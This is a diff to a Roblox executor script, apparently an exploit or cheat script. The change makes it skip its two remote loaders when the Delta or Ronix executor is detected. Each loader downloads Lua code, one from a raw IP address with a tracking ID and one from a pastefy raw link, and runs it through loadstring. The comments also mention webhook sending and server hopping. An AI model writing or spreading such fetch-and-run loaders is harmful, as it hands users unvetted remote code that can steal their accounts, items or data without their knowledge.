@@ -33,24 +33,32 @@ local function getExecutorName()
     end
 end
 
-local executor = getExecutorName()
+local executor = getExecutorName():lower()
 
 -- === External Script Loaders ===
 
--- Loader #1 (Blocked if Delta)
-if not executor:lower():find("delta") then
+-- Loader #1 (Blocked if Delta or Ronix)
+if not (executor:find("delta") or executor:find("ronix")) then
     pcall(function()
         ID = "0854e1f7-8990-4611-95eb-b0dd92c98509"
         loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
     end)
 else
-    warn("Delta executor detected. Skipping loader #1.")
+    warn("Blocked executor detected (Delta or Ronix). Skipping loader #1.")
 end
 
--- Loader #2 (Always runs)
-pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/Z7Wdks0M/raw"))()
-end)
+-- Loader #2 (Blocked if Ronix)
+if not executor:find("ronix") then
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/Z7Wdks0M/raw"))()
+    end)
+else
+    warn("Ronix executor detected. Skipping loader #2.")
+end
+
+-- ✅ Everything else remains unchanged and fully functional.
+-- Keep using your original script below this point
+-- (version check, UI setup, webhook sending, server hopping, etc.)
 
 -- Wait for game fully loaded
 repeat task.wait() until game:IsLoaded()
